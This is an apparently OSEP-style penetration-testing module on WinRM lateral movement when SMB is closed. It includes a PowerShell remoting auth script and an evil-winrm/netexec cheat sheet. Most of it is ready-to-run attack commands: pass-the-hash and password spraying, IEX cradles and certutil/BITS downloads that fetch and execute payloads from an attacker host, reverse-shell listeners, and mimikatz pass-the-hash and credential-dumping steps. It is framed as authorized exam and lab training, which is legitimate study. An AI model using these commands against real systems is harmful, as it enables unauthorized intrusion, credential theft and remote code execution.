::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Module M15: WinRM lateral movement (valid creds · WinRM only)

> Covers scenario: 56
>
> **Prerequisites:** you already have valid credentials (password / NTLM hash / Kerberos ticket); target 5985 (HTTP) or 5986 (HTTPS) is reachable; attacker box is Kali (evil-winrm, netexec, impacket) or a controlled Windows pivot

---

## Scenario 56: Credentials work, but the target only exposes WinRM

**Situation**: The identity is correct, but SMB (445) is closed — every lateral execution path that depends on SMB (PsExec, WMIC, smbexec, copy via `admin$` then schtasks, etc.) is dead; the target only exposes WinRM management ports. Use a WinRM session for execution and further lateral movement.

**Assumptions**:
- You hold: `USER` + `PASS` (plaintext), or `USER` + `NTHASH` (NTLM hash), or a domain Kerberos ticket (ccache/TGT).
- Target side: 5985/5986 listening (`winrm` service); the account is in local `Administrators` or `Remote Management Users` (WinRM’s default allow-list). In a domain, also confirm the user has **local** rights on the target — domain membership alone is not enough.
- Network: Kali→target 5985/5986 open; target→Kali 445/139 closed (otherwise this scenario is unnecessary). After multi-hop pivots, ensure port-forward/proxy reaches 5985/5986 first.
- Methods to abandon (**SMB closed = they fail; do not waste time**): `psexec.py`/PsExec, `wmiexec.py`/WMIC (most implementations write `admin$`), `smbexec.py`, SMB relay, copy scripts over SMB then `schtasks`/`sc`, drop PowerShell via `admin$`.

**Prepare (attacker)**:
1. Confirm Kali tools:
   ```bash
   which evil-winrm netexec 2>/dev/null
   gem list winrm 2>/dev/null | head -3    # evil-winrm depends on winrm gem
   ```
   If evil-winrm is missing: `sudo gem install evil-winrm` (often preinstalled on Kali; apt package `evil-winrm` also works). netexec succeeds crackmapexec on Kali (`netexec`); both command forms are given below.
2. Port reachability (before auth troubleshooting):
   ```bash
   nc -nvz TARGET 5985; nc -nvz TARGET 5986    # either open is enough
   ```
   HTTPS (5986) needs `evil-winrm -S`; handle self-signed certs later.
3. For Kerberos: prepare `/etc/hosts` or resolvable `DOMAIN` names, reachability to KDC (TCP/88), time sync (`ntpdate`/`chronyd` — tickets fail hard on clock skew >5 minutes).
4. Prepare in-session follow-on payloads (WinRM itself is the execution channel; usually no need to drop files):
   - PowerShell in-memory download/exec (IEX cradles);
   - If a file is required, have the target download outbound itself (certutil/BITS), not SMB pull-back.

**Procedure**:

1. **Check whether the account has WinRM rights on the target** (also validates the creds):
   ```bash
   # plaintext
   netexec winrm TARGET -u USER -p 'PASS'
   # hash (Pass-the-Hash over NTLM)
   netexec winrm TARGET -u USER -H NTHASH
   # domain account with -d DOMAIN
   netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
   ```
   Expected: `[+] TARGET:5985 - ... (Pwn3d!)`. `(Pwn3d!)` means local admin. Auth without that marker can still allow command execution (Remote Management Users need not be admins) — step 3 verifies for real.
2. **(Optional batch) multi-target / spray**: cheat sheet `WinRM password spraying` / `Multiple targets with WinRM`:
   ```bash
   netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
   ```
3. **evil-winrm session (plaintext or hash)**:
   ```bash
   # plaintext (HTTP)
   evil-winrm -i TARGET -u USER -p 'PASS'
   # plaintext + domain (usually unnecessary for NTLM; Kerberos needs -r)
   evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
   # NTLM hash (Pass-the-Hash)
   evil-winrm -i TARGET -u USER -H NTHASH
   # HTTPS
   evil-winrm -i TARGET -u USER -p 'PASS' -S
   ```
   Prompt becomes `*Evil-WinRM* PS C:\...>`; run `whoami` and `whoami /priv` first.
4. **Kerberos auth path** (domain; no plaintext, or avoid NTLM logs):
   Prerequisites: resolvable hostname (`/etc/hosts` entry `TARGET-IP  target.dom`), TGT for the account:
   ```bash
   # password → TGT (ccache)
   impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
   export KRB5CCNAME=$(pwd)/USER.ccache
   # or reuse an existing ticket
   netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
   ```
   evil-winrm’s Kerberos support is weak (env-dependent). Prefer:
   - From a controlled **Windows pivot**: `Enter-PSSession -ComputerName TARGET -Credential ...` (Kerberos by default);
   - On Kali: `netexec winrm ... -k` with `KRB5CCNAME`.
   Kerberos failures: name resolution, clock skew, SPN `http/target.dom`, ticket expiry.
5. **Confirm in-session command execution** (auth ≠ execute; non-admin Remote Management Users may hit language mode / execution policy limits):
   ```powershell
   whoami
   [Environment]::Is64BitOperatingSystem
   Get-ExecutionPolicy -List          # affects script files, not interactive commands
   ```
6. **Deliver follow-on payload in-session (two channels when SMB is closed)**:
   - **In-memory (preferred, no disk)**:
     ```powershell
     # attacker HTTP: python3 -m http.server 80
     IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
     # or download to memory then Invoke-Expression; wrap in a scriptblock when args are needed
     ```
     evil-winrm `scripts/` and `loot/` are local directories only; upload/download use the WinRM protocol (`upload`/`download` commands) — no SMB.
   - **On-disk (only if a file is required; target downloads itself)**:
     ```powershell
     certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
     # alternatives: BITSAdmin / Start-BitsTransfer / powershell -c (New-Object Net.WebClient)
     ```
     Do **not** assume `\\LHOST\share` works — closed SMB is the premise of this scenario.
7. **(Windows pivot path) skip evil-winrm; PowerShell Remoting from a controlled Windows host**:
   ```powershell
   # single interactive command
   winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
   # or PSSession
   $pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
   $c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
   $s  = New-PSSession -ComputerName TARGET -Credential $c
   Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
   # then reverse shell / same delivery as step 6
   ```
   `winrs`/WinRM client is built into Windows 10/Server 2016+; managed hosts with WinRM ports open are treated as PS-Remoting enabled in the exam.

**Scripts used**:
| Script | Purpose | Key params |
|---|---|---|
| `m15-winrm-auth-matrix.ps1` | Plaintext/hash/Kerberos templates + failure checklist (PowerShell Remoting path) | `-Target`, `-User`, `-Pass`/`-NtHash`, `-Domain` |
| `m15-winrm-lateral.md` | evil-winrm / netexec cheat sheet + in-session payload notes | — |

#### `m15-winrm-auth-matrix.ps1` {#m15-winrm-auth-matrix-ps1}

````powershell
<#
# Purpose: WinRM lateral PowerShell Remoting auth templates (plaintext / NTLM hash / Kerberos)
#          One call: port precheck -> New-PSSession -> one-shot command or interactive session;
#          on failure, print triage directions.
# Scenario: 56 (SMB closed, WinRM only; Windows pivot path — Linux path in m15-winrm-lateral.md)
# Depends: Windows 10/Server 2016+ built-in; no third-party modules.
#          Hash path via mimikatz pth needs mimikatz.exe (-Mimikatz path).
# Usage:
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -Pass 'PASS' [-Domain DOMAIN] [-Interactive]
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -NtHash NTHASH             # hash guidance in output
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET.fqdn -User DOMAIN\USER -Kerberos      # current ticket
# Placeholders: TARGET=IP/hostname  USER=username  PASS=password  NTHASH=NTLM hash (32 hex)
#               DOMAIN=AD domain (optional, builds DOMAIN\USER)
# Test status: local syntax check only (PowerShell parser); not live-tested on a real domain/lab —
#              verify line-by-line in the OSEP lab network.
# Hard fact: New-PSSession only accepts plaintext; no native NTLM PTH — see -NtHash branch.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Target,          # target IP or FQDN
    [Parameter(Mandatory = $true)][string]$User,            # username (may include DOMAIN\ prefix)
    [string]$Pass,                                          # plaintext password
    [string]$NtHash,                                        # NTLM hash (32 hex)
    [string]$Domain,                                        # optional AD domain
    [switch]$Kerberos,                                      # Kerberos auth (domain)
    [switch]$Interactive,                                   # Enter-PSSession
    [switch]$UseSSL,                                        # target 5986 (HTTPS)
    [string]$Command = 'whoami; hostname',                  # default one-shot
    [string]$Mimikatz                                       # optional mimikatz.exe path for hash path
)

$ErrorActionPreference = 'Stop'

function Write-Step($msg)  { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok($msg)    { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail($msg)  { Write-Host "[-] $msg" -ForegroundColor Red }

# ---------- 0. Mutual-exclusion checks ----------
if (-not $Pass -and -not $NtHash -and -not $Kerberos) {
    Write-Fail "Provide one credential form: -Pass plaintext / -NtHash hash / -Kerberos (current ticket)."
    exit 1
}
if ($Pass -and $NtHash) {
    Write-Fail "-Pass and -NtHash both set; pick one."
    exit 1
}
if ($Domain) { $User = "$Domain\$User" }   # normalize to DOMAIN\User (keep .\USER when no Domain)

# ---------- 1. Port precheck (SMB closed is the premise — do not burn time on 445) ----------
Write-Step "Checking target WinRM ports 5985/5986 ..."
$http  = Test-NetConnection -ComputerName $Target -Port 5985 -WarningAction SilentlyContinue
$https = Test-NetConnection -ComputerName $Target -Port 5986 -WarningAction SilentlyContinue
if (-not $http.TcpTestSucceeded -and -not $https.TcpTestSucceeded) {
    Write-Fail "Neither 5985 nor 5986 reachable. Confirm ports (nmap -Pn -p5985,5986),
    or port-forward 5985/5986 from this pivot first (see module M08 tunneling)."
    exit 1
}
if ($UseSSL -and -not $https.TcpTestSucceeded) {
    Write-Fail "-UseSSL requires 5986, but 5986 is unreachable. Drop -UseSSL and use 5985."
    exit 1
}
if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # auto HTTPS if only 5986
Write-Ok "Ports reachable (5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)), using $($(if($UseSSL){'HTTPS'}else{'HTTP'}))."

# ---------- 2. Auth form dispatch ----------
$sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60
if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60 -SkipCACheck -SkipCNCheck }

$cred = $null
if ($Pass) {
    # --- Template A: plaintext (most reliable; native New-PSSession) ---
    $secure = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $secure)
    Write-Step "Template A: plaintext auth $User @ $Target"
    $params = @{
        ComputerName  = $Target
        Credential    = $cred
        SessionOption = $sessionOption
        ErrorAction   = 'Stop'
    }
    if ($UseSSL)  { $params.UseSSL = $true }
    if ($Kerberos){ $params.Authentication = 'Kerberos' }   # optional explicit Kerberos in-domain
}
elseif ($NtHash) {
    Write-Step "Template B: NTLM hash $User @ $Target"
    if ($Mimikatz -and (Test-Path $Mimikatz)) {
        Write-Step "Inject hash with mimikatz sekurlsa::pth, then re-run this script without -NtHash (or winrs) in the elevated process:"
        Write-Host ("    {0} ""sekurlsa::pth /user:{1} /domain:{2} /ntlm:{3} /run:powershell.exe""" -f `
            $Mimikatz, $User.Split('\')[-1], $(if($User.Contains('\')){$User.Split('\')[0]}else{'.'}), $NtHash)
        Write-Ok  "After PTH succeeds, in the new powershell: winrs -r:$Target whoami — or this script using the current token (no -Pass)."
    }
    else {
        Write-Host "[!] Windows has no native NTLM-PTH-over-WinRM. Two alternatives:"
        Write-Host "    1) Linux path (recommended): evil-winrm -i $Target -u $User -H $NtHash (see m15-winrm-lateral.md)"
        Write-Host "    2) Windows path: mimikatz sekurlsa::pth /user:$($User.Split('\')[-1]) /ntlm:$NtHash /run:powershell.exe,"
        Write-Host "       then in the new process: winrs -r:$Target whoami (token already holds the hash; NTLM auth)."
    }
    exit 0   # hash path does not build a session here — avoid a fake template that cannot work
}
elseif ($Kerberos) {
    Write-Step "Template C: Kerberos auth $User @ $Target"
    if ($Target -notmatch '\.') {
        Write-Fail "Kerberos needs FQDN: -Target must be target.dom, not a bare IP (SPN http/target.dom depends on it)."
        exit 1
    }
    # Kerberos with -Pass goes through template A (Authentication already set). Here: current-ticket only.
    $params = @{
        ComputerName  = $Target
        Authentication = 'Kerberos'
        SessionOption = $sessionOption
        ErrorAction   = 'Stop'
    }
    if ($UseSSL)  { $params.UseSSL = $true }
    if ($cred)    { $params.Credential = $cred }
}

# ---------- 3. Session + one-shot / interactive ----------
try {
    $session = New-PSSession @params
    Write-Ok "PSSession OK: $($session.ComputerName)  State=$($session.State)"
}
catch {
    Write-Fail "New-PSSession failed: $($_.Exception.Message)"
    Write-Host "==== Failure triage (check in order) ===="
    Write-Host "1) Auth 'Access is denied'/401: is the account in Administrators or Remote Management Users? Domain spelling via -Domain; local accounts use .\USER."
    Write-Host "2) Connectivity: does the pivot need a tunnel to 5985/5986? Client WinRM: Get-Service WinRM; Start-Service WinRM (0x803381xx same)."
    Write-Host "3) HTTPS certs: -SkipCACheck/-SkipCNCheck already applied; still failing → confirm 5986 really is WinRM."
    Write-Host "4) Kerberos KRB_AP_ERR_*: FQDN resolution, clock (<5min), SPN http/<target FQDN>."
    exit 1
}

if ($Interactive) {
    Write-Step "Entering interactive session (type exit to leave)..."
    Enter-PSSession -Session $session
    Remove-PSSession $session
}
else {
    Write-Step "Running command: $Command"
    try {
        Invoke-Command -Session $session -ScriptBlock ([scriptblock]::Create($Command))
        Write-Ok "Command finished."
    }
    catch {
        Write-Fail "Command failed: $($_.Exception.Message) (auth ≠ execute; non-admin Remote Management Users may be limited — try cmd /c whoami)"
    }
    Remove-PSSession $session
}
````

#### `m15-winrm-lateral.md` {#m15-winrm-lateral-md}

````markdown
# m15 · WinRM lateral cheat sheet (Kali / evil-winrm / netexec)

> Scenario 56: valid creds, SMB closed, only 5985/5986 open. Linux attacker side;
>
> Windows pivot templates are in `m15-winrm-auth-matrix.ps1`.
>
> Placeholders: `TARGET`(IP/FQDN) `DOMAIN` `USER` `PASS` `NTHASH` `LHOST` `LPORT` `PAYLOAD` `URL`

## 1. Decide the path (≈30 seconds)

```bash
nmap -Pn -p445,5985,5986 TARGET          # only use this doc when 445 is closed; need 5985 or 5986
nc -nvz TARGET 5985; nc -nvz TARGET 5986
```

## 2. Auth + rights probe

```bash
# plaintext
netexec winrm TARGET -u USER -p 'PASS'
# NTLM hash (Pass-the-Hash)
netexec winrm TARGET -u USER -H NTHASH
# domain account
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
# multi-target batch (careful — lockout risk)
netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
```

- `(Pwn3d!)` = local admin on the target → command execution usually unconstrained.
- `[+]` without `(Pwn3d!)` = auth OK but not admin; may still be Remote Management Users — enter a session to verify.

## 3. Interactive session (evil-winrm)

```bash
# plaintext HTTP (5985)
evil-winrm -i TARGET -u USER -p 'PASS'
# explicit domain
evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
# NTLM hash
evil-winrm -i TARGET -u USER -H NTHASH
# HTTPS (5986)
evil-winrm -i TARGET -u USER -p 'PASS' -S
# local scripts/dict dirs (local paths only)
evil-winrm -i TARGET -u USER -p 'PASS' -s /opt/evil-winrm/scripts
```

In-session basics:

```text
*Evil-WinRM* PS> whoami ; whoami /priv
*Evil-WinRM* PS> upload ./PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe   # WinRM channel; no SMB
*Evil-WinRM* PS> download C:\Windows\Temp\result.txt ./result.txt
*Evil-WinRM* PS> menu          # built-ins (services/reg/loot, …)
```

> Note: evil-winrm `menu` `services`/`reg` use its built-ins; for long password-dump jobs prefer one-liners and copy output immediately.

## 4. Kerberos path (domain; works without SMB; needs ticket/DNS/clock)

```bash
# Prerequisites: resolvable FQDN + time sync
echo "TARGET-IP  target.dom" >> /etc/hosts
sudo ntpdate DC_IP || chronyc makestep     # clock skew vs DC <5 minutes

# password → TGT (ccache), or reuse an existing .ccache
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache

# ticket auth (Target must be FQDN)
netexec winrm target.dom -d DOMAIN -u USER -k --use-kcache
```

- evil-winrm Kerberos support is weak; for interactive Kerberos prefer Windows pivot `Enter-PSSession -Authentication Kerberos` (template C in m15-winrm-auth-matrix.ps1).
- `KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`: check `/etc/hosts`, clock, `klist` expiry, then SPN via `impacket-GetUserSPNs` or `ldapsearch`.

## 5. In-session payload delivery (two channels without SMB)

### 5.1 In-memory (preferred, no disk)

Attacker delivery:

```bash
python3 -m http.server 80            # or python3 -m http.server 443
# reverse listener
nc -lvnp LPORT
```

Inside evil-winrm:

```powershell
# download and run .ps1
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')

# no disk, no file: one-liner reverse (msfvenom → base64)
$b = [Convert]::FromBase64String('...'); $m=[System.Diagnostics.Process]::GetCurrentProcess(); ...
```

### 5.2 On-disk (only if needed: target downloads itself — never `\\LHOST\share`)

```powershell
certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
# alternatives
Start-BitsTransfer -Source http://LHOST/PAYLOAD.exe -Destination C:\Windows\Temp\PAYLOAD.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe','C:\Windows\Temp\PAYLOAD.exe')"
```

Then run: `C:\Windows\Temp\PAYLOAD.exe` (admin session can run directly; non-admin: collect info under least privilege first).

### 5.3 Exfil (target → attacker, bypass egress limits)

```text
# write results to a temp file, then download over WinRM (no target egress needed)
*Evil-WinRM* PS> whoami /all | Out-File C:\Windows\Temp\out.txt -Encoding ascii
*Evil-WinRM* PS> download C:\Windows\Temp\out.txt ./out.txt
```

## 6. Common failures

| Symptom | Cause / fix |
|---|---|
| `Access is denied` / 401 | Not in Remote Management Users/Administrators; check `-d` domain spelling |
| Auth OK but no `(Pwn3d!)` | Non-admin; enter session and test execution |
| 5986 cert errors | evil-winrm accepts self-signed by default; still failing → confirm it is WinRM TLS |
| `KRB_AP_ERR_MODIFIED` | Clock skew / hosts resolution — not a password problem |
| evil-winrm won’t start | Broken Ruby/gem → switch to netexec winrm or Windows path |
| Long commands hang | Split into one-liners; redirect output to a file then `download` |

## 7. OPSEC

- 5985 logons leave 4624/4625 + WinRM operational logs; password spraying can lock accounts — control attempts.
- NTLM hash auth leaves 4776 on the DC; quieter option is Kerberos (tickets, no password on the wire).
- Long jobs (mimikatz sekurlsa::logonpasswords) time out easily in evil-winrm: one line at a time, copy output, then continue.
````

**Validation**:
- `netexec winrm` shows `(Pwn3d!)` or at least `[+]` (auth OK).
- evil-winrm session opens and `whoami` returns the expected identity.
- Final proof of follow-on delivery is a callback: listener (`nc -lvnp LPORT` / msfconsole handler), reverse payload in-session, Kali receives the connection.
- If no callback, use **out-of-band checks**: `Invoke-Command` with `cmd /c "ping LHOST"` while Kali runs `tcpdump -i any icmp`; or have the target `curl http://LHOST/flag` and watch the delivery server 404/200 (see module 00 OOB validation).

**Failure branches (≥2)**:
1. **Auth denied (`Access is denied` / 401)** → confirm membership in `Remote Management Users`/`Administrators`; for domain accounts check `DOMAIN` spelling/case and `-d`; for hashes confirm NTLM (32 hex), not LM or Kerberos keys. Still failing → retry from a Windows pivot with `New-PSSession` to separate tool issues from permission issues.
2. **5985 open but only 5986 works, or vice versa** → toggle `-S` (HTTPS) and handle self-signed certs (evil-winrm accepts them by default; before adding peer-verification flags, confirm version); HTTP is simpler — prefer 5985 when available.
3. **Auth OK but commands fail / empty output** → account may be Remote Management Users (non-admin) with restricted PowerShell: try `cmd /c whoami`; try `-NoProfile`-style flags; treat as a constrained low-priv session (collect info; priv-esc via module M06).
4. **evil-winrm won’t start (Ruby/gem)** → use netexec `winrm` one-shots, or Windows pivot `winrs`/`New-PSSession` (no Ruby).
5. **Kerberos keeps failing** → drop Kerberos, use NTLM hash (`-H`) if you have plaintext/hash; if ticket-only, check `KRB5CCNAME`, `/etc/krb5.conf` realm, clock (`date` vs DC <5 minutes).
6. **Need a file but target egress is also blocked** → evil-winrm `upload` (WinRM 5985 channel itself — no 445/80 egress); drop under `C:\Windows\Temp` or `%TEMP%`; watch write rights and Defender scan paths.

**Exam / OPSEC**:
- **Confirm SMB is really closed** before abandoning PsExec-family tools — many lost points come from fighting the wrong channel without a port check. `nmap -Pn -p445,5985 TARGET` settles it once.
- WinRM on 5985 leaves PowerShell sessions plus 4624/4625 and `Microsoft-Windows-WinRM` operational logs; NTLM hash auth leaves 4776 on the DC. Password spraying (step 2) amplifies lockout risk — **only when explicitly allowed and attempt-capped**.
- evil-winrm `upload`/`download`, `scripts`/`loot` are session-only: files travel over WinRM — **do not** document “copy via SMB share” steps that contradict this scenario.
- Sessions are interactive: long jobs (mimikatz sekurlsa) hang/timeout easily — cheat sheet `Having an Evil-WinRM session`: one-liners, copy results immediately, or redirect to a file then `download`.
- Kerberos hard-requires name resolution; put the target hostname in Kali `/etc/hosts` or SPN resolution fails with `KRB_AP_ERR_MODIFIED`-class errors (check clock first).
- In non-admin sessions, do not jump straight to priv-esc/credential tools — least-privilege recon first, then decide whether M06 is needed.

---

## Module quick reference

```bash
# 1) Port decision (whether this module applies)
nmap -Pn -p445,5985,5986 TARGET

# 2) Auth + privilege probe (plaintext / hash / domain)
netexec winrm TARGET -u USER -p 'PASS'
netexec winrm TARGET -u USER -H NTHASH
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'

# 3) Interactive session (evil-winrm)
evil-winrm -i TARGET -u USER -p 'PASS'
evil-winrm -i TARGET -u USER -H NTHASH
evil-winrm -i TARGET -u USER -p 'PASS' -S        # 5986 HTTPS

# 4) Kerberos (in-domain; works without SMB / without plaintext)
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache
netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache

# 5) In-session in-memory delivery (preferred, no disk)
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')

# 6) Windows pivot path
winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
$s = New-PSSession -ComputerName TARGET -Credential (DOMAIN\USER,PASS)
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }

# 7) On-disk fallback (target downloads itself)
certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
```

---

## Related script list

| File | Description |
|---|---|
| `m15-winrm-auth-matrix.ps1` | Windows-side PowerShell Remoting plaintext/hash/Kerberos templates + failure triage |
| `m15-winrm-lateral.md` | Kali (evil-winrm/netexec) cheat sheet + in-session payload notes |
